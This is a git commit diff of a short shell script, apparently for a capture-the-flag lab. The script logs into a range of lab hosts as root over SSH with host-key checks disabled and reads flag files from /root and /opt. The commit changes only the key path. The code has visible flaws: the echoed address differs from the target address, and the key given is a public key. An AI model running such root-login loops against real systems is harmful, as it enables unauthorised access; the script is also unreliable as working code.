5e443ffe6b8de30de58f8944c677b5f29811b28e
JesusCries <62108395+WesleyWong420@users.noreply.github.com>
2022-12-15 01:08:37 -0800

    Update sshflags.sh

--- sshflags.sh
+++ sshflags.sh
@@ -2,6 +2,6 @@ for i in $(seq 105 108); do$
   echo "10.10.10.110.$i"$
   ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" \$
     -o "GlobalKnownHostsFile=/dev/null" -o "UserKnownHostsFile=/dev/null" \$
-    -i ~/home/kali/Desktop/updog \$
+    -i ~/home/kali/Desktop/updog/key.pub \$
     root@10.10.110.$i "cat /root/flag.txt; echo; cat /opt/flag.txt; echo" 2>/dev/null$
 done$
